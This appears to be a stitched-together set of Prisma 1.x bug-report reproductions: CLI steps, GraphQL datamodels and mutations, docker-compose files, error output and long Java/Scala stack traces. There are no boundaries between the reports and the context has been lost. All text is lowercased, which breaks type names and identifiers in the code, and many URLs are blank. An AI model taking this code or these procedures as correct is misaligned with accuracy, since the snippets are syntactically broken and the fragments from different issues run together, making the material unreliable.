prisma deploy
prisma playground
``` ```graphql
subscription ($where: usersubscriptionwhereinput) { user(where: $where) { node { id } }
``` ```json
{ "where": { "mutation_in": ["updated"] }
``` ```graphql
mutation a { createuser(data: { name: "nilan" }) { id }
mutation b { updateuser( data: { name: "nilan2" } where: { id: "cjguu5dvc7lfr0b51y7iccdbd" } ) { id }
mutation c { deleteuser(where: { id: "cjguu5dvc7lfr0b51y7iccdbd" }) { id }
``` > note: the subscription triggers are correct when using the equivalent subscription query _without_ variables.
make a breaking change to your `datamodel.graphql` that leads to errors when using `prisma deploy`
then used `prisma deploy -f` to force the changes.
`prisma.yml` as below:
endpoint: datamodel: datamodel.graphql
then run comment `prisma deploy && prisma playground`
npm install -g prisma@1.7.4
prisma init test
prisma playground
``` ![image](
i've setup a subscription on user type to send confirmation email after user creation, which looks as follows (running on prisma sandbox 1.7.4): ```graphql
subscription { user(where: { or: [{ mutation_in: [created] }, { mutation_in: [updated] updatedfields_contains: "confirmtoken" node: { confirmtoken_not: "null" } }] }) { node { email confirmtoken firstname lastname } }
``` when i try to create a new user i am getting following error: ```
error: argument \'where\' expected type \'usersubscriptionwhereinput\' but got: { or: [{ boolean: true }, { boolean: false, updatedfields_contains: "confirmtoken", node: { confirmtoken_not: "null" } }]
} reason: 'or[1].updatedfields_contains' field 'updatedfields_contains'
is not defined in the input type 'usersubscriptionwhereinput'
(line 2, column 15): ...
``` notice how `mutation_in: [created]` and `mutation_in: [updated]` from my
subscription query above are replaced with `boolean: true` and `boolean: false`.
npm install -g prisma
prisma init test-prisma
prisma deploy
prisma delete <img width="442" alt="screen shot 2018-05-03 at 14 49 20" src=" ">
image shows error when trying to prisma delete a deployed prisma server
you can delete the app manually on the app.prisma.sh
> deploy a server somewhere using docker and set the `managementapisecret` and try to deploy
you can start with a new prisma app , e.g
the node basic boilerplate.
- `graphql create my-app --boilerplate node-basic`
- make sure you're not logged in to prisma cloud, check in `~/.prisma/config.yml`
- run `npm run prisma delete -f` in the new project folder
- a browser window for log in to prisma cloud is opened
`docker-compose.yml`
version: '3'
services: prisma: image: prismagraphql/prisma:1.7 restart: always ports: - "4466:4466" environment: prisma_config: | managementapisecret: mymanagementsecret port: 4466 databases: default: connector: postgres active: true host: db port: 5432 user: root password: prisma db: image: postgres:9.6 restart: always ports: - "5432:5432" environment: postgres_user: root postgres_password: prisma
``` `prisma.yml`
endpoint: secret: myappsecret datamodel: datamodel.graphql hooks: post-deploy: - graphql get-schema --project database - graphql prepare
``` psequel connection details:
host: 127.0.0.1
password: prisma
database: root
local prisma updated to v1.7.1
![prismaver subcscription]( created subscription containing where clause (in subscription.js).
log in user (in playground) activate subscription (in playground - connected to localhost) create post - post is created, but subscription event is not published
![subscription_where_fail_1](
have invalid token and try to deploy to cloud.
- i just followed the example described [here]( docker-compose.yml:
version: '3'
services: prisma: image: prismagraphql/prisma:1.7 restart: always ports: - "4466:4466" environment: prisma_config: | managementapisecret: my-server-secret-123 port: 4466 databases: default: connector: mysql # or `postgres` active: true host: db port: 3306 # or `5432` for `postgres` user: root password: prisma db: image: mysql:5.7 restart: always environment: mysql_user: root mysql_root_password: prisma
``` then run docker-compose up -d, go to the browser, open and send some requests without any token
simply change node_port value in .env file
// datamodel.graphql
type record { field: string
ctx.db.query.records({ where: { field: null // compile error [ts] type 'null' is not assignable to type 'string | undefined'
}); ctx.db.mutation.updaterecord({ data: { field: null // compile error [ts] type 'null' is not assignable to type 'string | undefined'
use `tslint` with the `ban-types` rule enabled, and it will complain about the usage.
prisma init test
prisma deploy
prisma info --json
delete the files mentioned in the current behavior and then run `prisma deploy`.
### query all current posts ```graphql
{ posts { title related { title } }
{ "data": { "posts": [ { "title": "a", "related": [] }, { "title": "b", "related": [] }, { "title": "c", "related": [] } ] }
``` ### connect a to b & c
mutation { updatepost ( title: "a" data: { related: { connect: [{ title: "b" }, { title: "c" }] } } ) { title related { title } }
{ "data": { "updatepost": { "title": "a", "related": [ { "title": "b" }, { "title": "c" } ] } }
### connect b to c & a
mutation { updatepost ( title: "b" data: { related: { connect: [{ id: "c" }, { id: "a" }] } } ) { title related { title } }
{ "data": { "updatepost": { "title": "b", "related": [ { "title": "a" }, { "title": "c" }, { "title": "a" } ] } }
the relation a is duplicated and when you try to disconnect all relation from 3 of them (a, b, c) there will be an error
when disconnect b & a the 2nd times we will get > "the relation relatedmovies has no node for the model post with the value \'b\' for the field \'title\' connected to a node for the model post with the value \'a\' for the field \'title\'"
type myrequiredjson { id: id! @unique json: json!
``` replace `__endpoint__`: ```sh
curl \'__endpoint__\' -h \'accept-encoding: gzip, deflate, br\' -h \'content-type: application/json\' -h \'accept: application/json\' -h \'connection: keep-alive\' -h \'dnt: 1\' -h \'origin: -h \'json: {}\' --data-binary \'{"query":"mutation b($json: json!) {\ createmyrequiredjson(data: {json: $json}) {\ id\ }\ }", "variables": {"json": " "}}\' --compressed
``` this sets the `json` value to `" "`, which is invalid.
mutation { createadvice(params: { name: "saraasdh", value: 1, description: "description", categories: { connect: [{ id: "asdasd"}] } }) { id name categories { id } }
const resolvers = { query: { advices(parent, args, ctx, info) { return ctx.db.query.advices(args, info) }, }, mutation: { async createadvice(parent, {params}, ctx, info) { console.log(params); console.log(params.categories[0].connect); return ctx.db.mutation.createadvice({data: params}, info) }, },
type advice { id: id! @unique name: string! value: int! description: string! tags: [advicetag!]! @relation(name: "tagsofadvice") categories: [advicecategory!]! @relation(name: "categoriesofadvice")
} type advicetag { id: id! @unique name: string! advices: [advice!]! @relation(name: "tagsofadvice")
} type advicecategory { id: id! @unique name: string! advices: [advice!]! @relation(name: "categoriesofadvice")
type advice { id: id! name:string! value: int! description: string! tags: [advicetag]! categories: [advicecategory]!
} type advicetag { id: id! name: string!
} type advicecategory { id: id! name: string!
} input createadviceparams { name:string! value: int! description: string! tags: [createconnect] categories: [createconnect]
} input createconnect { create: [names] connect: [ids]
} input ids { id: id!
} input names { name: string!
} input createadvicetagparams { name: string!
} input createadvicecategoryparams { name: string!
database shema ```graphql
type post { id: id! @unique related: [post!]! @relation(name: "relatedposts")
for example we have 2 post a with id `cjbz2h6eej5gf0113ow5par0d` and and post b with id `cjda754u0vlfu01850l4hw31t`
now let connect them together ```graphql
mutation { updatepost ( id: "cjbz2h6eej5gf0113ow5par0d" data: { related: { connect: { id: "cjda754u0vlfu01850l4hw31t" } } } ) { id related { id } }
{ "data": { "updatepost": { "id": "cjbz2h6eej5gf0113ow5par0d", "related": [ { "id": "cjda754u0vlfu01850l4hw31t" } ] } }
query a we have
{ "data": { "movie": { "id": "cjbz2h6eej5gf0113ow5par0d", "related": [ { "id": "cjda754u0vlfu01850l4hw31t" } ] } }
query b we have
{ "data": { "movie": { "id": "cjda754u0vlfu01850l4hw31t", "related": [] } }
i use basic "hello world" example from the docs
$ prisma local start
$ prisma deploy --watch deploying service `prisma` to stage `dev` on cluster `local`..
service is already up to date
hooks: checking, if schema file changed..
110ms writing database schema to `src/generated/prisma.graphql` ..
running $ graphql prepare...
watching for change..
# changes in ./database/datamodel.graphql does not trigger a service update
``` but if i change the schema (for example, add field `foo: boolean` to `post`) when a deploy is not started and after that start a deploy: ```sh
$ prisma deploy --watch deploying service `prisma` to stage `dev` on cluster `local`..
50ms changes: post (type) + created field `foo` of type `boolean` applying changes..
applying changes..
applying changes..
1.1s your graphql database endpoint is live: http: ws: ws://localhost:4466/prisma/dev hooks: checking, if schema file changed..
172ms writing database schema to `src/generated/prisma.graphql` ..
running $ graphql prepare...
watching for change..
# at this moment i remove field `foo` from `post` in `./database/datamodel.graphql` deploying service `prisma` to stage `dev` on cluster `local`..
80ms changes: post (type) - deleted field `foo` applying changes..
applying changes..
applying changes..
1.1s your graphql database endpoint is live: http: ws: ws://localhost:4466/prisma/dev checking, if schema file changed..
84ms writing database schema to `src/generated/prisma.graphql` ..
running $ graphql prepare...
watching for change..
# just save the file for trigger update deploying service `prisma` to stage `dev` on cluster `local`..
service is already up to date
checking, if schema file changed..
watching for change..
# watch mode stops work
any my changes have ignored ```
npm install -g prisma
prisma init a
prisma deploy
``` add `subscriptions` to `prisma.yml` file: ```yml
subscriptions: userchangedemail: webhook: url: # replace with your own webhook headers: content-type: application/json authorization: bearer cha2eiheiphesash3shoofo7eceexaequeebuyaequ1reishiujuu6weisao7ohc query: | subscription { user { node { name } } }
prisma deploy
prisma playground
``` ```graphql
mutation { createuser(data: { name: "nilan" }) { id }
``` refresh browser at webhook url
no event is triggered.
prisma init a
prisma deploy
prisma playground --web # opens electron app
after importing datasetaexport and failing or timing out or repeating on `prisma import -d datasetaexport.zip` a folder named `.import` can be left in the directory
the data is reset with `prisma reset` when then attempting to import datasetbexport `prisma import -d datasetbexport.zip` a series of errors on relations or nodes listed below: ` "failure inserting into relationtable _assetproductfeaturedphoto with ids cja4a<id>si3 and cja4b<id>cl
cause: java.sql.sqlintegrityconstraintviolationexception: cannot add or update a child row: a foreign key constraint fails (`<cluster>-prisma@env`.`_assetproductfeaturedphoto`, constraint `_assetproductfeaturedphoto_ibfk_1` foreign key (`a`) references `asset` (`id`) on delete cascade)"
` "failure inserting into relationtable _assetproductfeaturedphoto with ids cja4a42pl53ch01550gkf2si3 and cja4bmby764qk0144eoc5itcl
cause: java.sql.sqlintegrityconstraintviolationexception: cannot add or update a child row: a foreign key constraint fails (`vyrl-prisma@pink`.`_assetproductfeaturedphoto`, constraint `_assetproductfeaturedphoto_ibfk_1` foreign key (`a`) references `asset` (`id`) on delete cascade)"
]` this can be resolved by: `rm -rf .import`
`prisma reset`
`prisma import -d datasetbexport.zip`
type user { id: id! @unique name: string! jsons: [json!]!
``` ```graphql
mutation b { createuser(data: { name: "nilna" jsons: { set: ["{}"] } }) { jsons }
``` this results in following error: ```
{ "data": { "createuser": { "jsons": null } }, "errors": [ { "message": "whoops
looks like an internal server error
search your cluster logs for request id: api:api:cjf84ytvx6prn0925fyw2ilee", "path": [ "createuser", "jsons", 0 ], "requestid": "api:api:cjf84ytvx6prn0925fyw2ilee" } ]
``` **note:** i currently don't have access to a local cluster to reproduce logs
if you have the cluster logs for this error, please share them in a comment.
npm install -g prisma@1.4.1
prisma local upgrade
prisma init test
``` adjust `datamodel.graphql` to ```graphql
type a { id: id! @unique title: string! b: b! @relation(name: "ab")
} type b { id: id! @unique title: string! as: [a!]! @relation(name: "ab" ondelete: cascade) c: c! @relation(name: "bc")
} type c { id: id! @unique title: string! bs: [b!]! @relation(name: "bc")
prisma deploy
prisma playground
``` add some data: ```
mutation a { yes: createa(data: { title: "a" b: { create: { title: "b" c: { create: { title: "yes" } } } } }) { title b { title c { title } } } no: createa(data: { title: "a" b: { create: { title: "b" c: { create: { title: "no" } } } } }) { title b { title c { title } } }
``` try to run the following `deletemanyas` mutation: ```graphql
mutation b { deletemanyas(where: { b: { c: { title: "yes" } } }) { count }
``` you'll receive an internal server error, with logs similar to this: ```
{ "key": "error/unhandled", "requestid": "...", "clientid": "...", "payload": { "exception":"java.lang.illegalargumentexception: unsupported scalar value in slickextensions: listmap(title -> some(<--string-->))", "query":"mutation ($_where: automationresultwhereinput!) {\ deletemanyautomationresults(where: $_where) {\ count\ }\ }\ ", "variables":"{\\"_where\\":{\\"automationtest\\":{\\"feature\\":{\\"title\\":\\"patients\\"}}}}", "code":"0", "stack_trace":"com.prisma.api.database.slickextensions$.escapeunsafeparam(slickextensions.scala:93)\\\ com.prisma.api.database.queryarguments$.$anonfun$generatefilterconditions$2(queryarguments.scala:351)\\\ scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234)\\\ scala.collection.immutable.list.foreach(list.scala:389)\\\ scala.collection.traversablelike.map(traversablelike.scala:234)\\\ scala.collection.traversablelike.map$(traversablelike.scala:227)\\\ scala.collection.immutable.list.map(list.scala:295)\\\ com.prisma.api.database.queryarguments$.generatefilterconditions(queryarguments.scala:240)\\\ com.prisma.api.database.queryarguments$.filteronrelation$1(queryarguments.scala:236)\\\ com.prisma.api.database.queryarguments$.$anonfun$generatefilterconditions$2(queryarguments.scala:387)\\\ scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234)\\\ scala.collection.immutable.list.foreach(list.scala:389)\\\ scala.collection.traversablelike.map(traversablelike.scala:234)\\\ scala.collection.traversablelike.map$(traversablelike.scala:227)\\\ scala.collection.immutable.list.map(list.scala:295)\\\ com.prisma.api.database.queryarguments$.generatefilterconditions(queryarguments.scala:240)\\\ com.prisma.api.database.databasequerybuilder$.$anonfun$countallfrommodel$1(databasequerybuilder.scala:80)\\\ scala.option.flatmap(option.scala:171)\\\ com.prisma.api.database.databasequerybuilder$.countallfrommodel(databasequerybuilder.scala:79)\\\ com.prisma.api.database.dataresolver.countbymodel(dataresolver.scala:53)\\\ com.prisma.api.database.dataresolver.countbymodel(dataresolver.scala:50)\\\ com.prisma.api.mutations.mutations.deletemany.<init>(deletemany.scala:23)\\\ com.prisma.api.schema.schemabuilderimpl.$anonfun$deletemanyfield$1(schemabuilder.scala:210)\\\ sangria.execution.resolver.resolvefield(resolver.scala:1024)\\\ sangria.execution.resolver.resolvesinglefieldseq(resolver.scala:236)\\\ sangria.execution.resolver.$anonfun$resolveseq$2(resolver.scala:216)\\\ scala.concurrent.future.$anonfun$flatmap$1(future.scala:302)\\\ scala.concurrent.impl.promise.$anonfun$transformwith$1(promise.scala:37)\\\ scala.concurrent.impl.callbackrunnable.run(promise.scala:60)\\\ akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)\\\ akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)\\\ scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)\\\ scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)\\\ akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)\\\ akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)\\\ akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:43)\\\ akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)\\\ akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)\\\ akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)\\\ akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)", "message":"unsupported scalar value in slickextensions: listmap(title -> some(<--string-->))"}
``` running the same mutation without filters works as expected: ```graphql
mutation b2 { deletemanyas (where: {}) { count }
``` you can verify the difference by running this query: ```graphql
query c { as { b { c { title } } }
``` note the `ondelete: cascade` statement in ` as: [a!]! @relation(name: "ab" ondelete: cascade)`, that might be related to #2103.
npm install -g prisma@1.4.1
prisma init test # choose minimal
prisma deploy
prisma delete
``` **note:** `prisma reset` works as expected.
prisma init # choose minimal
prisma deploy
prisma playground
``` this opens ` ` in the browser
`prisma version`: `prisma/1.4.1 (linux-x64) node-v7.2.0`
`graphql version`: `zsh: command not found: graphql` `.graphqlconfig.yml` ```yml
projects: database: extensions: prisma: prisma.yml
``` `prisma.yml` ```yml
service: import-id-missing
stage: dev datamodel: datamodel.graphql # to enable auth, provide
# secret: my-secret
disableauth: true
cluster: public-specklemoose-482/prisma-eu1
``` i don't have the electron app installed.
deploy a new service using this data model: ```graphql
type a { id: id! @unique title: string # b1: b @relation(name: "ab1") # b2: b @relation(name: "ab2") # b3: b @relation(name: "ab3")
} type b { id: id! @unique title: string # a1: a @relation(name: "ab1") # a2: a @relation(name: "ab2") # a3: a @relation(name: "ab3")
``` uncomment `a1` and `b1` and deploy
uncomment `a2` and `b2` and deploy
uncomment `a3` and `b3` and deploy
it doesn't work! this is on version `1.4.1`.
types: ```graphql
type plan { id: id! @unique createdat: datetime! updatedat: datetime! title: string! description: string # set if this plan is an adjustment from a previous plan previousplan: plan nutritiondays: nutritiondays!
} type nutritiondays { id: id! @unique plan: plan!
``` if i add `a: int` to the `nutritiondays` type, it deploys without an issue.
use `prisma@1.3.5` or below
create a local cluster
run `prisma cluster logs` output:
$ prisma cluster logs ! cluster logs for non-local clusters is not implemented yet
$ prisma cluster logs local ! cluster logs for non-local clusters is not implemented yet
``` i have a local cluster set up, and the proper configuration to connect to it stored in a `.env` file in the same directory
*note*: i am using windows 10, node 8.9.3, prisma 1.3.5
> run a `deletemany` mutation where a relation = null
it will delete every node.
deploy a new cluster via docker-compose.yml (fresh mysql instance + prisma)
set the sql_internal_database to something else than graphcool
deploy the config via docker compose.
whatch the logs to see if the database will be bootstrap
service: servicename
cluster: local
disableauth: true
datamodel: - types.graphql - enums.graphql
subscriptions: fetchsnippetlexicons: query: subscriptions/fetch-snippet-data.graphql webhook: ${url} ``` removing the subscription and deploying the service, then introducing the subscription into the schema works
**expected behaviour?**
a new service with a subscription should be deployed successfully.
i currently have this type:
type honeycomb { id: id! @unique title: string! hint: string sugar: [string!]! @default(value: []) # represents possible answers type: honeycomb_type! hive: hive!
``` and here's my mutation:
```typescript
export const honeycomb = { async updatehoneycomb(parent, args, ctx: context, info) { const beekeeperid = getbeekeeperid(ctx) const { id, sugar, ...rest } = args const foundhoneycomb = await ctx.db.exists.honeycomb({ id, hive: { author: { id: beekeeperid, }, }, }) if (!foundhoneycomb) throw new error(`honeycomb not found or you're not the author`) return ctx.db.mutation.updatehoneycomb( { where: { id }, data: { ...rest, sugar: { set: sugar || [] }, }, }, info, ) }
**ps:** if you have any comments on how i could make this mutation work with less lines of code, do tell ;)
i prepared a reproduction with an older version here:
- add a new type and deploy
- remove it and deploy again
- re-add the type to a new test
- just remove a field to see that this change is well displayed in the console
deletemanyclusterusages(data: $data) { count }
{ "data": { "where": { "cluster": { "name": "clustr-name", "workspace": { "slug": "lol" } }, "billingdate": "2018-04-01t00:00:00.000z" } }
this seems to be the case in any situation in which an object has a parent/child of its own data type.
create a cluster in amazon ecs
create a new task definition 3
choose the fargate compatibility mode
fill out env vars / etc
as necessary.
save the task definition
run the task with launch type: fargate
view your container's logs
here's my logs:
listening for transport dt_socket at address: 8000
error: exception thrown by the agent : java.net.malformedurlexception: local host name unknown: java.net.unknownhostexception: 823064ca3923: 823064ca3923: system error
``` i believe this is because fargate uses the `awsvpc` networking mode (exclusively), and java is trying to attach a debugger to a host that doesn't exist
i tried adding a `-djava.security.manager` flag to my `java_opts` environment variable, but it doesn't seem to change anything
it's unclear if this is because (a) the debugger doesn't get disabled by that flag, or (b) the error isn't coming from a debugger
relevant articles:
(see "compliant solution")
run the following mutation
mutation updatemanytasks {
updatemanytasks(
where: { id_in: ["cjead1ixy0 ","cjeadhukt0 "]
data: { user: { connect: { username: "ragzor" } } }, ) {
``` schema defined as: ```
type user { createdat: datetime! id: id! @unique username: string! @unique password: string! name: string! role: role! @default(value: "unregistered") tasks: [task!]!
type task { id: id! @unique store: store! status: status! user: user createdat: datetime! # start/receive date
``` it works perfectly while running a single mutation like so: ```
mutation updatetask { updatetask(
where: { id: "cjead1ixy0 "
data: { user: { connect: { username: "ragzor" } } }, ) {
prisma init
mkdir folder
touch folder/seed.graphql # write some seed file
prisma deploy
prisma import -d folder
you can reproduce this issue by deploying a prisma api and visiting `generated/prisma.ts`
the issue is found near the bottom
// error here
public query: query = { // etc, not relevant
when hovering over `query`, due to red underline, this is the error notice: ```
property 'query' in type 'prisma' is not assignable to the same property in base type 'prisma'
type 'query' is not assignable to type 'querymap'
index signature is missing in type 'query'.
``` more on repro later
i don't really have time to build a demo repro but will try sometime this week
essentially, all i am doing is upgrading my old `graphcool` project data model
for example, change `defaultvalue(value: "")` to `default(value: "")`
the cli will continue to give the error to change to `default(value: "")`
it seems as if only directives are affected by this caching
i have not noticed this effect elsewhere
will update should that happen.
* `prisma init` # choose minimal
* `prisma deploy`
* `prisma playground` versions: * `prisma version`: `prisma/1.3.0 (darwin-x64) node-v9.6.1`
* electron pg: `version 1.4.3 (1.4.3.2587)`
add 2 relations between 2 types which were not there before i.e
type mote { # creator: user! members: [user!]!
} type user {
type mote { creator: user! @relation(name: "creator") members: [user!]! @relation(name: "memberof")
} type user { motes: [mote!]! @relation(name: "creator") memberof: [mote!]! @relation(name: "memberof")
``` it works if you have it in the initial deploy
the `datamodel.graphql` file
type calendar { id: id! @unique name: string! bookings: [booking!]!
} type booking { id: id! @unique totalprice: int! calendar: calendar!
``` the `seed.graphql` file
mutation { firstcalendar: createcalendar( data: { name: "bob\'s calendar" bookings: { create: [{ totalprice: 9900 }] } } ) { id }
- update your prisma client to 1.2.8
- deploy a service that uses an int type (looks like this gets renamed on the server side to long)
- run `prisma deploy` to a local cluster (or any cluster)
prisma import -d *.zip
all was going smoothly until i modified one of the existing type objects and redeployed
for example, i had a 'usertype' field on the user object
i then removed this field and redeployed
prisma returns its normal, "changes ..
user (type) - deleted field usertype" and purports to regenerate my database schema for graphql-yoga-usage
i then start the server and start getting: `[graphql error]: message: whoops
looks like an internal server error
search your cluster logs for request id: api:api:cjdxkxpjy00vd0114rskwol1b, location: [object object], path: createuser
[network error]: error: whoops
looks like an internal server error
search your cluster logs for request id: api:api:cjdxkxpjy00vd0114rskwol1b` i then redeploy prisma
instead of it telling me that everything is up to date, prisma says its deleting the field again..
(which it again claims to have done successfully)
i check my generated schema and the field is still there
any time i try to connect to the service, my pod keeps throwing java.sql.sqlsyntaxerrorexceptions and the service is completely unusable
here is the error being thrown in my pod: `java.sql.sqlsyntaxerrorexception: (conn=1776) unknown column 'usertype' in 'field list'
at org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.get (exceptionmapper.java:163)
at org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.getexception (exceptionmapper.java:106)
at org.mariadb.jdbc.mariadbstatement.executeexceptionepilogue (mariadbstatement.java:235)
at org.mariadb.jdbc.mariadbpreparedstatementclient.executeinternal (mariadbpreparedstatementclient.java:224)
at org.mariadb.jdbc.mariadbpreparedstatementclient.execute (mariadbpreparedstatementclient.java:159)
at com.zaxxer.hikari.pool.proxypreparedstatement.execute (proxypreparedstatement.java:44)
at com.zaxxer.hikari.pool.hikariproxypreparedstatement.execute (hikariproxypreparedstatement.java)
at slick.jdbc.statementinvoker.results (statementinvoker.scala:39)
at slick.jdbc.statementinvoker.iteratorto (statementinvoker.scala:22)
at slick.jdbc.invoker.first (invoker.scala:31)
at slick.jdbc.invoker.first$ (invoker.scala:30)
at slick.jdbc.statementinvoker.first (statementinvoker.scala:16)
at slick.jdbc.streaminginvokeraction$headaction.run (streaminginvokeraction.scala:52)
at slick.jdbc.streaminginvokeraction$headaction.run (streaminginvokeraction.scala:51)
at slick.dbio.dbioaction$$anon$4.$anonfun$run$3 (dbioaction.scala:240)
at scala.collection.iterator.foreach (iterator.scala:929)
at scala.collection.iterator.foreach$ (iterator.scala:929)
at scala.collection.abstractiterator.foreach (iterator.scala:1417)
at scala.collection.iterablelike.foreach (iterablelike.scala:71)
at scala.collection.iterablelike.foreach$ (iterablelike.scala:70)
at scala.collection.abstractiterable.foreach (iterable.scala:54)
at slick.dbio.dbioaction$$anon$4.run (dbioaction.scala:240)
at slick.dbio.dbioaction$$anon$4.run (dbioaction.scala:238)
at slick.dbio.dbioaction$$anon$4.$anonfun$run$3 (dbioaction.scala:240)
at scala.collection.iterator.foreach (iterator.scala:929)
at scala.collection.iterator.foreach$ (iterator.scala:929)
at scala.collection.abstractiterator.foreach (iterator.scala:1417)
at scala.collection.iterablelike.foreach (iterablelike.scala:71)
at scala.collection.iterablelike.foreach$ (iterablelike.scala:70)
at scala.collection.abstractiterable.foreach (iterable.scala:54)
at slick.dbio.dbioaction$$anon$4.run (dbioaction.scala:240)
at slick.dbio.dbioaction$$anon$4.run (dbioaction.scala:238)
at slick.dbio.synchronousdatabaseaction$fusedandthenaction.$anonfun$run$4 (dbioaction.scala:534)
at slick.dbio.synchronousdatabaseaction$fusedandthenaction.$anonfun$run$4$adapted (dbioaction.scala:534)
at scala.collection.iterator.foreach (iterator.scala:929)
at scala.collection.iterator.foreach$ (iterator.scala:929)
at scala.collection.abstractiterator.foreach (iterator.scala:1417)
at scala.collection.iterablelike.foreach (iterablelike.scala:71)
at scala.collection.iterablelike.foreach$ (iterablelike.scala:70)
at scala.collection.abstractiterable.foreach (iterable.scala:54)
at slick.dbio.synchronousdatabaseaction$fusedandthenaction.run (dbioaction.scala:534)
at slick.dbio.synchronousdatabaseaction$$anon$11.run (dbioaction.scala:571)
at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1 (basicbackend.scala:240)
at slick.basic.basicbackend$databasedef$$anon$2.run (basicbackend.scala:240)
at java.util.concurrent.threadpoolexecutor.runworker (threadpoolexecutor.java:1149)
at java.util.concurrent.threadpoolexecutor$worker.run (threadpoolexecutor.java:624)
at java.lang.thread.run (thread.java:748)
add a new cluster with a trailing `/` to your `~/.prisma/config.yml`.
`prisma export` fails with `typeerror: cannot read property 'jsonelements' of undefined`
reading the debug (below) the problem seems to be the download url is invalid because the export function isn't taking into account that i'm logged in
it's trying url ` `
the correct url is: ` (as an aside, i tried to work out a pr, but #1932 put up too much of a fight.)
prisma project with following package.json
"dependencies": { "bcryptjs": "2.4.3", "dotenv": "5.0.0", "graphql-yoga": "1.3.2", "jsonwebtoken": "8.1.1", "prisma-binding": "1.5.12" }, "devdependencies": { "@types/bcryptjs": "2.4.1", "dotenv-cli": "1.4.0", "graphql-cli": "2.14.1", "nodemon": "1.14.12", "npm-run-all": "4.1.2", "prisma": "1.2.3", "rimraf": "2.6.2", "ts-node": "4.1.0", "typescript": "2.6.2" }
* deploy a service to a private cluster
* run `prisma info` you'll see an endpoint like this: ```
deploy a service to a private cluster
run `prisma delete`.
i'm running this inside an openbsd 6.2 vmm alpine linux 3.7 virt guest
\\h:\\w$ docker -v
docker version 17.10.0-ce, build ba9946cf23
\\h:\\w$ prisma -v
prisma/1.2.2 (linux-x64) node-v8.9.3
\\h:\\w$ graphql -v
\\h:\\w$ node -v
\\h:\\w$ yarn -v
* create a new private cluster
* run `prisma cluster list`
* acknowledge that the list does not contain the new cluster
relevant `schema.graphql`: ```graphql
type query { me: user
} type user { email: string! firstname: string! id: id! isemailverified: boolean! lastname: string! locale: user_locale! updatedat: datetime! flags: [user_flags!]
``` client query:
query userauthquery { me { ...userinfo } } fragment userinfo on user { id, locale, useremail: email, firstname, lastname, flags, }
``` if i change `useremail: email` to just `email` then the query works without issue.
i am not sure on this one but this is how my prisma.yml looks like ```
divyendusingh [prisma]$ cat database/prisma.yml
# the name for the service (will be part of the service's http endpoint)
service: ds stage: dev secret: very-secret-going-to-version-control-but-i-know-it-and-dont-care datamodel: datamodel.graphql seed: import: seed.graphql cluster: prisma-eu1
``` this is for this codebase:-
i just changed cluster from `local` to `prisma-eu1`
another point to note is that my email has a "." in it and in past i faced an issue while doing `prisma login`
that could be related to this
please let me know how can i help reproduce this one.
log in to cloud with email ( `prisma login`) and run `prisma deploy` for this service:
read more information [here](
just run `yarn test`
i ran into that error when using `prisma cluster add` and pasting in the secret
i believe my shell introduced an additional line break when doing so, so i needed to update `~/.prisma/config.yml` manually to remove the unexpected line break.
create new project with the following data model ```graphql type user { id: id! @unique scores: [int!]! } ``` 2
send mutation: ```graphql mutation { createuser(data: { scores: { set: [1,2,3,4,5] } }) { id } } ``` 3
send mutation: ```graphql mutation { updateuser(where: { id: "cjd4lfdyww0h00144zst9alur" }, data: { scores: { set: [10, 20] } }) { id } } ``` 4
send query: ```graphql { users { scores } } ``` 5
scores has the following values: ``` "scores": [ 10, 20, 3, 4, 5 ] ```
type user @model { id: id! @unique verifytoken: string @unique
mutation { createuser(data: { verifytoken: "any string here" }) { id verifytoken }
const updateuser = await ctx.db.mutation.updateuser( { where: { id: user.id }, data: { verifytoken: null, }, } )
``` response (shown in the graphql yoga server)
mutation ($_data: userupdateinput!, $_where: userwhereuniqueinput!) { updateuser(data: $_data, where: $_where) { id verifytoken }
{ "_data": { "verifytoken": null }, "_where": { "id": "cjd0vvumo01e10108958vtxoh" }
response from
{ "updateuser": { "id": "cjd0vvumo01e10108958vtxoh", "verifytoken": "any string here", }
have the previous resolver with the user role defaulting to `citizen` if nothing is passed in query arguments:
mutation { createdriver( data:{ email:"testing@this.com" password:"1234567890" } ) { id email role }
``` the `role` argument is not passed because i want to explicit tell it what role in the resolver, but it doesn't seem to work
it will save the mutation with the default `role` written in the `datamodel.graphql`.
type company { id: id! @unique name: string! name_suffix: string # company by company parent: company
``` connect parent is ok
mutation setcompanyparent( $parent: id! $child: id!
){ parent: updatecompany( data: { parent: { connect: { id: $parent } } } where: { id: $child } ){ id name }
``` result:
{ "data": { "parent": { "id": "cjd398wos00bn0197z2ywbn0l", "name": "dr loder rgergregerg", "parent": { "id": "cjd398pkg00bj0197fn8ek1ir", "name": "dr loder" } } }
``` update parent is error
mutation updatecompanyparent( $parent: id! $child: id!
){ parent: updatecompany( data: { parent: { update: { data: { name:"sdfsdf" } where: { id: $parent } } } } where: { id: $child } ){ id name }
``` disconnect error to
mutation unsetcompanyparent( $parent: id! $child: id!
){ parent: updatecompany( data: { parent: { disconnect: { id: $parent } } } where: { id: $child } ){ id name }
{ "data": { "parent": null }, "errors": [ { "locations": [ { "line": 64, "column": 3 } ], "path": [ "parent" ], "code": 3041, "message": "the relation companytocompany has no node for the model company with value `cjd398wos00bn0197z2ywbn0l` for id connected to a node for the model company with value `cjd398pkg00bj0197fn8ek1ir` for id", "requestid": "api:api:cjd39zibu00e201972wh74qet" } ]
``` type to another type requests is ok.
deploy this schema
type contentprovider { id: id! @unique type: contentprovidertype!
} enum contentprovidertype { twitter
``` insert 2 records with the twitter type:
mutation { t1: createcontentprovider( data: { type: twitter }) { id } t2: createcontentprovider( data: { type: twitter }) { id }
``` update the schema by adding @unique to type field
